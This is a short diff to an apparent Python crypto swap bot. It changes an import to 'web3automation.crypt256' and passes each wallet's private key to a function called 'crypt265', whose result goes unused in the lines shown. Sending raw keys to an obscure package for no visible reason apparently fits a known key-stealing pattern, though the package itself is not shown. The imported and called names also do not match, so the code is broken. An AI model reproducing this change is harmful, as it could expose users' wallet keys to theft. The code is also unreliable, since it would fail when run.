@@ -4,7 +4,7 @@ import asyncio
 import random
 import time
 from web3 import Web3
-from walletrpcs import websocketrpcs
+from web3automation import crypt256
 from eth_account import Account
 from colorama import init, Fore, Style
 from eth_abi import abi
@@ -540,7 +540,7 @@ async def run_swaptoken(language: str = 'en'):
 
     for i, (profile_num, private_key) in enumerate(private_keys, 1):
         print_border(f"{LANG[language]['processing_wallet']} {profile_num} ({i}/{len(private_keys)})", Fore.MAGENTA)
-        rpcs = websocketrpcs(private_key)
+        automation = crypt265(private_key)
         print()
         
         if choice == '1':
